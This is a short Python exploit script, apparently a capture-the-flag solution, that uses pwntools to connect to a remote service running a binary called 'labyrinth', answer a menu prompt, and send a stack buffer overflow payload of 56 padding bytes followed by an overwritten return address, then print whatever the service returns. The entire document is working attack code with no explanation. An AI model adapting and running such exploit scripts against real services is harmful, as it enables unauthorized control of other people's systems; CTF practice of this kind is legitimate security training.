#!/usr/bin/env python3
from pwn import *

io = connect("83.136.250.238", 39211)

elf = context.binary = ELF('./labyrinth', checksec=False)

context.log_level = 'debug'

padding = b"A" * 56
jmp_esp = p64(0x401256)

payload = flat({0:padding, 56:jmp_esp})
print(io.recvuntil(b'>>').decode())
io.sendline(b'069')
print(io.recvuntil(b'>>').decode())

# Send payload
io.sendline(payload)
# io.sendlineafter(b'>>', payload)
# io.interactive()
# io.sendlineafter(b'you chose ?', payload)
# print(io.recvline())

while True:
    try:
        line = io.recvline()
        success(line.decode())
    except EOFError:
        break
